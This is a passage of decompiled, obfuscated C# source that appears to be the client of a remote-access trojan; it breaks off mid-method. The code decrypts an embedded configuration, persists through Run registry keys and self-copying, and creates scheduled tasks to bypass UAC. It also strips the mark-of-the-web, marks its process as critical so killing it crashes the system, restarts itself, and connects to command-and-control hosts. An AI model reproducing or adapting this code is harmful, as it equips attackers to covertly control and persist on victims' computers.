using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

[StandardModule]
internal sealed class Class8
{
	public static List<Guid> list_0;

	public static List<Guid> list_1;

	public static Dictionary<Guid, GStruct0> dictionary_0;

	public static Queue<string> queue_0;

	private static string string_0;

	private static string string_1;

	private static string string_2;

	private static string string_3;

	public static Dictionary<string, object> dictionary_1;

	public static bool bool_0;

	public static bool bool_1;

	private static Mutex mutex_0;

	public static byte[] byte_0;

	public static byte[] byte_1;

	public static DateTime dateTime_0;

	public static Dictionary<string, Client> dictionary_2;

	public static List<GClass2> list_2;

	public static GClass6 gclass6_0;

	public static GClass6 gclass6_1;

	public static GClass8 gclass8_0;

	private static DateTime dateTime_1;

	public static StreamWriter streamWriter_0;

	public static bool bool_2;

	public static bool bool_3;

	public static ClientLoaderForm clientLoaderForm_0;

	public static Client client_0;

	private static bool bool_4;

	public static byte[] byte_2;

	private static GClass5 gclass5_0;

	public static bool bool_5;

	private static long long_0;

	public static DateTime dateTime_2 = DateTime.MaxValue;

	public static List<string> list_3;

	public static int int_0;

	public static int int_1;

	private static Assembly assembly_0;

	private static DateTime dateTime_3;

	public static void smethod_0()
	{
		Application.add_ThreadException((ThreadExceptionEventHandler)smethod_58);
		AppDomain.CurrentDomain.UnhandledException += smethod_57;
		AppDomain.CurrentDomain.AssemblyResolve += smethod_69;
		list_3 = new List<string>();
		list_0 = new List<Guid>();
		dictionary_0 = new Dictionary<Guid, GStruct0>();
		dictionary_1 = new Dictionary<string, object>();
		Environment.CurrentDirectory = Application.get_StartupPath();
		if (!smethod_13())
		{
			smethod_17();
		}
		smethod_20();
		smethod_21();
		smethod_22();
		smethod_2();
		smethod_11();
		smethod_12();
		smethod_3();
		smethod_25();
		smethod_28();
		smethod_23();
		smethod_24();
		smethod_26();
		smethod_27();
		smethod_29();
		smethod_30();
		smethod_4();
		smethod_6();
		if (byte_1 != null)
		{
			smethod_9();
			smethod_8();
		}
		smethod_63();
		smethod_1();
		smethod_44();
	}

	private static void smethod_1()
	{
		client_0 = smethod_39();
		client_0.method_0(smethod_70);
		client_0.method_4(smethod_71);
		client_0.method_14(smethod_72);
		client_0.method_2(smethod_73);
		client_0.method_6(smethod_76);
	}

	private static void smethod_2()
	{
		Class15.guid_0 = smethod_33();
		Class15.bool_0 = smethod_32();
		Class15.intptr_0 = Class9.GetCurrentProcess();
		Class15.string_0 = smethod_34(Class15.guid_0);
		Class15.string_1 = Path.Combine(Path.Combine(Class15.string_0, "Exceptions"), Class15.smethod_1().ToString());
		Class15.dateTime_0 = smethod_35(Class15.string_0);
		Class15.bool_1 = Environment.OSVersion.Version.Major > 5;
		GStruct1 gStruct = GStruct1.smethod_0(Class15.guid_0);
		Class15.string_2 = gStruct.string_0;
		Class15.string_3 = gStruct.string_1;
	}

	private static void smethod_3()
	{
		smethod_87("Builder settings loaded..");
		foreach (KeyValuePair<string, object> item in dictionary_1)
		{
			smethod_87($"{item.Key} = {RuntimeHelpers.GetObjectValue(item.Value)}");
		}
	}

	private static void smethod_4()
	{
		string path = Path.Combine(Class15.string_0, "catalog.dat");
		if (!File.Exists(path))
		{
			return;
		}
		try
		{
			byte[] array = File.ReadAllBytes(path);
			object[] array2 = Class13.smethod_2(array);
			object[] array3 = array2;
			for (int i = 0; i < array3.Length; i++)
			{
				object objectValue = RuntimeHelpers.GetObjectValue(array3[i]);
				list_0.Add((Guid)objectValue);
			}
			List<Guid> list = new List<Guid>();
			foreach (KeyValuePair<Guid, GStruct0> item in dictionary_0)
			{
				if (!list_0.Contains(item.Key))
				{
					list.Add(item.Key);
				}
			}
			foreach (Guid item2 in list)
			{
				dictionary_0.Remove(item2);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "LoadPluginCatalog");
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_5(Guid[] guid_0)
	{
		string path = Path.Combine(Class15.string_0, "catalog.dat");
		try
		{
			List<object> list = new List<object>();
			foreach (Guid guid in guid_0)
			{
				list.Add(guid);
			}
			byte[] bytes = Class13.smethod_1(list.ToArray());
			File.WriteAllBytes(path, bytes);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "SavePluginCatalog");
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_6()
	{
		string path = Path.Combine(Class15.string_0, "storage.dat");
		if (!File.Exists(path))
		{
			return;
		}
		try
		{
			byte[] array = File.ReadAllBytes(path);
			object[] array2 = Class13.smethod_2(array);
			DateTime t = (DateTime)array2[0];
			if (DateTime.Compare(dateTime_0, t) < 0)
			{
				dateTime_0 = t;
				byte_1 = (byte[])array2[1];
				byte_0 = Class18.smethod_2(byte_1);
			}
			int num = array2.Length - 1;
			for (int i = 2; i <= num; i += 4)
			{
				GStruct0 value = default(GStruct0);
				value.guid_0 = (Guid)array2[i];
				value.dateTime_0 = (DateTime)array2[i + 1];
				value.string_0 = (string)array2[i + 2];
				value.byte_1 = (byte[])array2[i + 3];
				value.byte_0 = Class18.smethod_2(value.byte_1);
				if (!list_0.Contains(value.guid_0))
				{
					continue;
				}
				if (dictionary_0.ContainsKey(value.guid_0))
				{
					if (DateTime.Compare(dictionary_0[value.guid_0].dateTime_0, value.dateTime_0) < 0)
					{
						dictionary_0[value.guid_0] = value;
					}
				}
				else
				{
					dictionary_0.Add(value.guid_0, value);
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "LoadCachedPlugins");
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_7()
	{
		string path = Path.Combine(Class15.string_0, "storage.dat");
		try
		{
			List<object> list = new List<object>();
			list.Add(dateTime_0);
			list.Add(byte_1);
			foreach (GClass2 item in list_2)
			{
				if (item.bool_0)
				{
					list.Add(item.guid_0);
					list.Add(item.dateTime_0);
					list.Add(item.string_0);
					list.Add(item.byte_0);
				}
			}
			byte[] bytes = Class13.smethod_1(list.ToArray());
			File.WriteAllBytes(path, bytes);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "SaveCachedPlugins");
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_8()
	{
		smethod_87("Initializing cached plugins..");
		foreach (KeyValuePair<Guid, GStruct0> item in dictionary_0)
		{
			GStruct0 value = item.Value;
			GClass2 gClass = new GClass2();
			gClass.string_0 = value.string_0;
			gClass.guid_0 = value.guid_0;
			gClass.bool_0 = true;
			gClass.byte_0 = value.byte_1;
			gClass.byte_1 = value.byte_0;
			Class14.smethod_0(value.byte_1, gClass);
		}
		dictionary_0.Clear();
	}

	public static void smethod_9()
	{
		if (!bool_5)
		{
			bool_5 = true;
			dictionary_2 = new Dictionary<string, Client>();
			list_2 = new List<GClass2>();
			gclass6_0 = new GClass6(smethod_66);
			gclass6_1 = new GClass6(smethod_67);
			gclass8_0 = new GClass8(dictionary_1);
			smethod_10();
			smethod_93("settings.bin");
			gclass5_0 = new GClass5();
			gclass5_0.method_0(smethod_94);
			gclass5_0.method_3(1000);
			gclass5_0.method_6();
		}
	}

	private static void smethod_10()
	{
		gclass6_0.SetValue("ClientId", Class15.guid_0);
		gclass6_0.SetValue("FirstRunDate", Class15.dateTime_0);
		gclass6_0.SetValue("IsRunningAsAdmin", Class15.bool_0);
		gclass6_0.SetValue("IsVistaOrLater", Class15.bool_1);
		gclass6_0.SetValue("ApplicationFolder", Class15.string_0);
		gclass6_0.SetValue("ClientFriendlyName", Class15.string_2);
		gclass6_0.SetValue("ClientExecutableName", Class15.string_3);
		gclass6_0.SetValue("ProcessHandle", Class15.intptr_0);
	}

	private static void smethod_11()
	{
		string_1 = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
		string_0 = Path.Combine(Class15.string_2, Class15.string_3);
		string_3 = Path.Combine(Class15.string_0, string_0);
		string_2 = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles), string_0);
	}

	private static void smethod_12()
	{
		queue_0 = new Queue<string>();
		try
		{
			if (Directory.Exists(Class15.string_1))
			{
				string[] files = Directory.GetFiles(Class15.string_1, "*.dat");
				foreach (string path in files)
				{
					queue_0.Enqueue(Path.GetFileNameWithoutExtension(path));
				}
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "InitializeExceptionQueue");
			ProjectData.ClearProjectError();
		}
	}

	private static bool smethod_13()
	{
		byte[] array = smethod_16();
		if (array != null)
		{
			MemoryStream input = new MemoryStream(array);
			BinaryReader binaryReader = new BinaryReader(input);
			byte[] byte_ = binaryReader.ReadBytes(binaryReader.ReadInt32());
			Guid guid_ = smethod_18(Assembly.GetExecutingAssembly());
			byte_2 = smethod_19(byte_, guid_);
			Class13.smethod_0(byte_2);
			byte[] array2 = binaryReader.ReadBytes(binaryReader.ReadInt32());
			object[] array3 = Class13.smethod_2(array2);
			int num = default(int);
			object[] array4 = new object[(int)array3[num] - 1 + 1];
			num++;
			Array.Copy(array3, num, array4, 0, array4.Length);
			num += array4.Length;
			object[] array5 = new object[(int)array3[num] - 1 + 1];
			num++;
			Array.Copy(array3, num, array5, 0, array5.Length);
			smethod_14(array5);
			smethod_15(array4);
			return true;
		}
		return false;
	}

	private static void smethod_14(object[] object_0)
	{
		int num = object_0.Length - 1;
		for (int i = 0; i <= num; i += 2)
		{
			string key = (string)object_0[i];
			object objectValue = RuntimeHelpers.GetObjectValue(object_0[i + 1]);
			if (dictionary_1.ContainsKey(key))
			{
				dictionary_1[key] = RuntimeHelpers.GetObjectValue(objectValue);
			}
			else
			{
				dictionary_1.Add(key, RuntimeHelpers.GetObjectValue(objectValue));
			}
		}
	}

	private static void smethod_15(object[] object_0)
	{
		if (object_0.Length != 0)
		{
			dateTime_0 = (DateTime)object_0[0];
			byte_1 = (byte[])object_0[1];
			byte_0 = Class18.smethod_2(byte_1);
			int num = object_0.Length - 1;
			for (int i = 2; i <= num; i += 4)
			{
				GStruct0 value = default(GStruct0);
				value.guid_0 = (Guid)object_0[i];
				value.dateTime_0 = (DateTime)object_0[i + 1];
				value.string_0 = (string)object_0[i + 2];
				value.byte_1 = (byte[])object_0[i + 3];
				value.byte_0 = Class18.smethod_2(value.byte_1);
				dictionary_0.Add(value.guid_0, value);
			}
		}
	}

	private static byte[] smethod_16()
	{
		IntPtr intPtr = Class9.FindResourceEx(IntPtr.Zero, 10, 1, 0);
		if (intPtr == IntPtr.Zero)
		{
			return null;
		}
		IntPtr intPtr2 = Class9.LoadResource(IntPtr.Zero, intPtr);
		if (intPtr2 == IntPtr.Zero)
		{
			return null;
		}
		int num = Class9.SizeofResource(IntPtr.Zero, intPtr);
		if (num == 0)
		{
			return null;
		}
		IntPtr intPtr3 = Class9.LockResource(intPtr2);
		if (intPtr3 == IntPtr.Zero)
		{
			return null;
		}
		byte[] array = new byte[num - 1 + 1];
		Marshal.Copy(intPtr3, array, 0, array.Length);
		return array;
	}

	private static void smethod_17()
	{
	}

	private static Guid smethod_18(Assembly assembly_1)
	{
		return new Guid(((GuidAttribute)assembly_1.GetCustomAttributes(typeof(GuidAttribute), inherit: false)[0]).Value);
	}

	private static byte[] smethod_19(byte[] byte_3, Guid guid_0)
	{
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(guid_0.ToByteArray(), guid_0.ToByteArray(), 8);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(16);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(16);
		return rijndaelManaged.CreateDecryptor().TransformFinalBlock(byte_3, 0, byte_3.Length);
	}

	private static void smethod_20()
	{
		if (!Class15.smethod_16())
		{
			return;
		}
		if (Class9.AllocConsole())
		{
			bool_2 = true;
		}
		try
		{
			streamWriter_0 = new StreamWriter("client.log", append: true);
			streamWriter_0.AutoFlush = true;
			bool_3 = true;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			if (bool_2)
			{
				smethod_86(exception_, "HandleEnableDebugModeBuilderSetting");
			}
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_21()
	{
		int num = Class15.smethod_22();
		int num2 = 0;
		while (true)
		{
			if (num2 <= num)
			{
				mutex_0 = new Mutex(initiallyOwned: true, $"Global\\{{{Class15.smethod_2()}}}", out var createdNew);
				if (!createdNew)
				{
					Thread.Sleep(250);
					num2 += 250;
					continue;
				}
				break;
			}
			smethod_42();
			break;
		}
	}

	private static void smethod_22()
	{
		if (Class15.smethod_17() != 0)
		{
			Thread.Sleep(Class15.smethod_17());
		}
	}

	private static void smethod_23()
	{
		if (Class15.smethod_11())
		{
			smethod_38(Application.get_ExecutablePath());
		}
	}

	private static void smethod_24()
	{
		if (!Class15.smethod_8() || Class15.bool_0)
		{
			return;
		}
		ProcessStartInfo processStartInfo = new ProcessStartInfo(Application.get_ExecutablePath());
		processStartInfo.WorkingDirectory = Environment.CurrentDirectory;
		processStartInfo.Verb = "runas";
		try
		{
			Process.Start(processStartInfo);
			smethod_42();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "HandleRequestElevationBuilderSetting");
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_25()
	{
		if (Class15.smethod_7())
		{
			if (Class15.bool_0)
			{
				smethod_54();
			}
			else
			{
				smethod_52();
			}
		}
	}

	private static void smethod_26()
	{
		if (Class15.smethod_12())
		{
			Class17.smethod_2();
		}
	}

	private static void smethod_27()
	{
		if (Class15.smethod_13())
		{
			smethod_40(bool_6: true);
		}
	}

	private static void smethod_28()
	{
		if (!Class15.smethod_9() || !Class15.bool_1)
		{
			return;
		}
		string text = (Class15.bool_0 ? Class8.string_2 : string_3);
		if (Class15.bool_0)
		{
			if (Class15.smethod_10() == null)
			{
				return;
			}
			string @string = Encoding.UTF8.GetString(Class15.smethod_10());
			if (!string.Equals(Application.get_ExecutablePath(), text, StringComparison.InvariantCultureIgnoreCase))
			{
				string string_ = @string.Replace("#EXECUTABLEPATH", Application.get_ExecutablePath());
				if (smethod_47(Class15.string_2, string_, 10000))
				{
					smethod_37(Application.get_ExecutablePath());
				}
			}
			if (Class15.smethod_7())
			{
				string string_2 = @string.Replace("#EXECUTABLEPATH", text);
				smethod_47(Class15.string_2 + " Task", string_2, 10000);
			}
		}
		else
		{
			string text2 = Class15.string_2;
			if (string.Equals(Application.get_ExecutablePath(), text, StringComparison.InvariantCultureIgnoreCase))
			{
				text2 += " Task";
			}
			else if (!string.Equals(Application.get_ExecutablePath(), smethod_36(), StringComparison.InvariantCultureIgnoreCase))
			{
				return;
			}
			if (smethod_48(text2, 10000))
			{
				smethod_42();
			}
		}
	}

	private static void smethod_29()
	{
		if (!Class15.smethod_31() || string.Equals(Application.get_ExecutablePath(), string_3, StringComparison.InvariantCultureIgnoreCase) || string.Equals(Application.get_ExecutablePath(), string_2, StringComparison.InvariantCultureIgnoreCase))
		{
			return;
		}
		ThreadPool.QueueUserWorkItem(delegate
		{
			((Delegate0)delegate
			{
				//IL_0016: Unknown result type (might be due to invalid IL or missing references)
				MessageBox.Show(Class15.smethod_33(), Class15.smethod_32(), (MessageBoxButtons)0, (MessageBoxIcon)Class15.smethod_34(), (MessageBoxDefaultButton)0, (MessageBoxOptions)131072);
			})();
		});
	}

	private static void smethod_30()
	{
		if (!Class15.smethod_14())
		{
			return;
		}
		ThreadPool.QueueUserWorkItem(delegate
		{
			((Delegate0)delegate
			{
				smethod_95();
			})();
		});
	}

	private static bool smethod_31()
	{
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", writable: false);
		if (registryKey == null)
		{
			return true;
		}
		return Conversions.ToInteger(registryKey.GetValue("EnableLUA", 1)) == 1;
	}

	private static bool smethod_32()
	{
		if (!smethod_31())
		{
			return true;
		}
		WindowsPrincipal windowsPrincipal = new WindowsPrincipal(WindowsIdentity.GetCurrent());
		return windowsPrincipal.IsInRole(WindowsBuiltInRole.Administrator);
	}

	private static Guid smethod_33()
	{
		string text = Class17.smethod_0("SOFTWARE\\Microsoft\\Cryptography", "MachineGuid");
		if (string.IsNullOrEmpty(text))
		{
			return Guid.Empty;
		}
		return new Guid(text);
	}

	private static string smethod_34(Guid guid_0)
	{
		string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), guid_0.ToString().ToUpper());
		try
		{
			Directory.CreateDirectory(text);
			return text;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "GetAndCreateApplicationFolderPath");
			ProjectData.ClearProjectError();
			return text;
		}
	}

	private static DateTime smethod_35(string string_4)
	{
		DateTime result = DateTime.UtcNow;
		string path = Path.Combine(string_4, "run.dat");
		try
		{
			if (File.Exists(path))
			{
				byte[] value = File.ReadAllBytes(path);
				result = DateTime.FromBinary(BitConverter.ToInt64(value, 0));
				return result;
			}
			File.WriteAllBytes(path, BitConverter.GetBytes(result.ToBinary()));
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "GetAndCreateFirstRunDate");
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string smethod_36()
	{
		string path = Path.Combine(Class15.string_0, "task.dat");
		if (!File.Exists(path))
		{
			return null;
		}
		try
		{
			string text = File.ReadAllText(path);
			if (File.Exists(text))
			{
				return text;
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "GetUACTaskPath");
			ProjectData.ClearProjectError();
		}
		return null;
	}

	private static void smethod_37(string string_4)
	{
		string path = Path.Combine(Class15.string_0, "task.dat");
		try
		{
			File.WriteAllText(path, string_4);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "CreateUACTaskPath");
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_38(string string_4)
	{
		Class9.DeleteFile(string_4 + ":Zone.Identifier");
	}

	public static Client smethod_39()
	{
		Client client = new Client();
		client.method_27(Class15.smethod_23());
		client.method_29(Class15.smethod_24());
		client.method_19(Class15.smethod_25());
		client.method_21(Class15.smethod_26());
		client.method_25(Class15.smethod_27());
		client.method_40(Class15.smethod_28());
		if (Class15.smethod_28())
		{
			IPAddress address = null;
			List<IPAddress> list = new List<IPAddress>();
			if (IPAddress.TryParse(Class15.smethod_29(), out address))
			{
				list.Add(address);
			}
			if (IPAddress.TryParse(Class15.smethod_30(), out address))
			{
				list.Add(address);
			}
			client.method_42(list.ToArray());
		}
		return client;
	}

	public static void smethod_40(bool bool_6)
	{
		if (!Class15.bool_0)
		{
			return;
		}
		try
		{
			Process.EnterDebugMode();
			int num = (bool_6 ? 1 : 0);
			int num2 = Class9.NtSetInformationProcess(Class15.intptr_0, 29, ref num, 4);
			if (num2 != 0)
			{
				smethod_86(new Exception($"Call to NtSetInformationProcess has failed with error code {num2:X}"), "UpdateProcessBreakOnTermination");
			}
			Process.LeaveDebugMode();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "UpdateProcessBreakOnTermination");
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_41()
	{
		Process.Start(Application.get_ExecutablePath());
		smethod_42();
	}

	public static void smethod_42()
	{
		smethod_40(bool_6: false);
		Environment.Exit(0);
	}

	public static void smethod_43()
	{
		Thread.Sleep(Class15.smethod_18());
		smethod_44();
	}

	private static void smethod_44()
	{
		string arg = smethod_65();
		smethod_87($"Connecting to {arg}:{Class15.smethod_6()}..");
		client_0.method_44(arg, Class15.smethod_6());
	}

	public static void smethod_45()
	{
		if (Interlocked.Increment(ref long_0) == 1L)
		{
			Class17.smethod_1();
			smethod_40(bool_6: false);
		}
	}

	public static void smethod_46()
	{
		if (long_0 != 0L && Interlocked.Decrement(ref long_0) == 0L)
		{
			if (Class15.smethod_12())
			{
				smethod_26();
			}
			if (Class15.smethod_13())
			{
				smethod_27();
			}
		}
	}

	private static bool smethod_47(string string_4, string string_5, int int_2)
	{
		try
		{
			string tempFileName = Path.GetTempFileName();
			string string_6 = $"/create /f /tn \"{string_4}\" /xml \"{tempFileName}\"";
			File.WriteAllText(tempFileName, string_5);
			ProcessStartInfo startInfo = smethod_50("schtasks.exe", string_6);
			Process process = Process.Start(startInfo);
			bool result = default(bool);
			if (process.WaitForExit(int_2))
			{
				result = process.ExitCode == 0;
			}
			File.Delete(tempFileName);
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "CreateScheduledTask");
			ProjectData.ClearProjectError();
		}
		return false;
	}

	private static bool smethod_48(string string_4, int int_2)
	{
		try
		{
			string string_5 = $"/run /tn \"{string_4}\"";
			ProcessStartInfo startInfo = smethod_50("schtasks.exe", string_5);
			Process process = Process.Start(startInfo);
			if (process.WaitForExit(int_2))
			{
				return process.ExitCode == 0;
			}
			bool result = default(bool);
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "RunScheduledTask");
			ProjectData.ClearProjectError();
		}
		return false;
	}

	private static bool smethod_49(string string_4, int int_2)
	{
		try
		{
			string string_5 = $"/delete /f /tn \"{string_4}\"";
			ProcessStartInfo startInfo = smethod_50("schtasks.exe", string_5);
			Process process = Process.Start(startInfo);
			if (process.WaitForExit(int_2))
			{
				return process.ExitCode == 0;
			}
			bool result = default(bool);
			return result;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "DeleteScheduledTask");
			ProjectData.ClearProjectError();
		}
		return false;
	}

	private static ProcessStartInfo smethod_50(string string_4, string string_5)
	{
		ProcessStartInfo processStartInfo = new ProcessStartInfo(string_4, string_5);
		processStartInfo.UseShellExecute = false;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		return processStartInfo;
	}

	private static bool smethod_51(string string_4)
	{
		if (!File.Exists(string_4))
		{
			return false;
		}
		FileStream fileStream = null;
		try
		{
			fileStream = File.OpenRead(Application.get_ExecutablePath());
			string text = Class18.smethod_3(fileStream);
			fileStream.Close();
			fileStream = File.OpenRead(string_4);
			string text2 = Class18.smethod_3(fileStream);
			fileStream.Close();
			return Operators.CompareString(text, text2, false) == 0;
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "CompareFileHashes");
			ProjectData.ClearProjectError();
		}
		finally
		{
			fileStream?.Close();
		}
		return false;
	}

	private static void smethod_52()
	{
		try
		{
			if (!smethod_56())
			{
				Directory.CreateDirectory(Path.GetDirectoryName(string_3));
				if (!smethod_51(string_3))
				{
					File.Delete(string_3);
					File.Copy(Application.get_ExecutablePath(), string_3);
				}
				RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(string_1, writable: true);
				registryKey.SetValue(Class15.string_2, string_3);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "AddUserStartup");
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_53()
	{
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(string_1, writable: true);
			if (registryKey.GetValue(Class15.string_2, null) != null)
			{
				registryKey.DeleteValue(Class15.string_2);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "DeleteUserStartup");
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!string.Equals(Application.get_ExecutablePath(), string_3, StringComparison.InvariantCultureIgnoreCase))
			{
				File.Delete(string_3);
			}
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Exception exception_2 = ex2;
			smethod_86(exception_2, "DeleteUserStartup");
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_54()
	{
		try
		{
			Directory.CreateDirectory(Path.GetDirectoryName(string_2));
			if (!smethod_51(string_2))
			{
				File.Delete(string_2);
				File.Copy(Application.get_ExecutablePath(), string_2);
			}
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_1, writable: true);
			registryKey.SetValue(Class15.string_2, string_2);
			smethod_53();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "AdminAdminStartup");
			ProjectData.ClearProjectError();
		}
	}

	private static void smethod_55()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_1, writable: true);
			if (registryKey.GetValue(Class15.string_2, null) != null)
			{
				registryKey.DeleteValue(Class15.string_2);
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "DeleteAdminStartup");
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!string.Equals(Application.get_ExecutablePath(), string_2, StringComparison.InvariantCultureIgnoreCase))
			{
				File.Delete(string_2);
			}
		}
		catch (Exception ex2)
		{
			ProjectData.SetProjectError(ex2);
			Exception exception_2 = ex2;
			smethod_86(exception_2, "DeleteAdminStartup");
			ProjectData.ClearProjectError();
		}
	}

	private static bool smethod_56()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(string_1, writable: false);
			string a = Conversions.ToString(registryKey.GetValue(Class15.string_2, string.Empty));
			return string.Equals(a, string_2, StringComparison.InvariantCultureIgnoreCase);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "CheckForAdminSetup");
			ProjectData.ClearProjectError();
		}
		return false;
	}

	private static void smethod_57(object sender, UnhandledExceptionEventArgs e)
	{
		smethod_59((Exception)e.ExceptionObject);
	}

	private static void smethod_58(object sender, ThreadExceptionEventArgs e)
	{
		smethod_59(e.Exception);
	}

	private static void smethod_59(Exception exception_0)
	{
		try
		{
			smethod_86(exception_0, "HandleException");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		smethod_60(exception_0);
		try
		{
			Thread.Sleep(Class15.smethod_19());
			Process.Start(Application.get_ExecutablePath());
			smethod_42();
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_60(Exception exception_0)
	{
		try
		{
			string text = Class17.smethod_6(exception_0);
			string text2 = BitConverter.ToString(Class18.smethod_1(text)).Replace("-", string.Empty).ToLower();
			string path = Path.Combine(Class15.string_1, text2 + ".dat");
			if (!File.Exists(path))
			{
				Directory.CreateDirectory(Class15.string_1);
				File.WriteAllBytes(path, Class13.smethod_1(new object[1] { text }));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static string smethod_61(string string_4)
	{
		string path = Path.Combine(Class15.string_1, string_4 + ".dat");
		if (!File.Exists(path))
		{
			return string.Empty;
		}
		object[] array = Class13.smethod_2(File.ReadAllBytes(path));
		return (string)array[0];
	}

	public static void smethod_62(string string_4)
	{
		try
		{
			string path = Path.Combine(Class15.string_1, string_4 + ".dat");
			File.Delete(path);
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception exception_ = ex;
			smethod_86(exception_, "DeleteExceptionLog");
			ProjectData.ClearProjectError();
		}
	}

	public static void smethod_63()
	{
		lock (list_3)
		{
			smethod_87("Rebuilding host cache..");
			int_0 = 0;
			int_1 = 0;
			list_3.Clear();
			smethod_64(Class15.smethod_4());
			smethod_64(Class15.smethod_5());
			if (byte_1 != null)
			{
				smethod_68();
			}
			int num = list_3.Count - 1;
			for (int i = 0; i <= num; i++)
			{
				smethod_87($"Host: {list_3[i]}");
			}
		}
	}

	public static void smethod_64(string string_4)
	{
		lock (list_3)
		{
			if (string.IsNullOrEmpty(string_4))
			{
				return;
			}
			string item = string_4.Replace("*", string.Empty);
			if (!list_3.Contains(item))
			{
				list_3.Add(item);
			}
			int num = 0;
			do
			{
				item = string_4.Replace("*", Conversions.ToString(num));
				if (!list_3.Contains(item))
				{
					list_3.Add(item);
				}
				num++;
			}
			while (num <= 9);
		}
	}

	public static string smethod_65()
	{
		lock (list_3)
		{
			return list_3[int_0];
		}
	}

	private static void smethod_66(string string_4)
	{
		if (list_2 == null)
		{
			return;
		}
		foreach (GClass2 item in list_2)
		{
			if (item.gclass3_0 != null)
			{
				try
				{
					item.gclass3_0.method_0(string_4);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception exception_ = ex;
					smethod_85(item.gclass3_0, exception_, "VariableChanged");
					ProjectData.ClearProjectError();
				}
			}
		}
	}

	private static void smethod_67(string string_4)
	{
		if (list_2 == null || !bool_0)
		{
			return;
		}
		bool_1 = true;
		foreach (GClass2 item in list_2)
		{
			if (item.gclass3_0 != null)
			{
				try
				{
					item.gclass3_0.method_1(string_4);
				}
				catch (Exception ex)
				{
					ProjectData.SetProjectError(ex);
					Exception exception_ = ex;
					smethod_85(item.gclass3_0, exception_, "ClientSettingChanged");
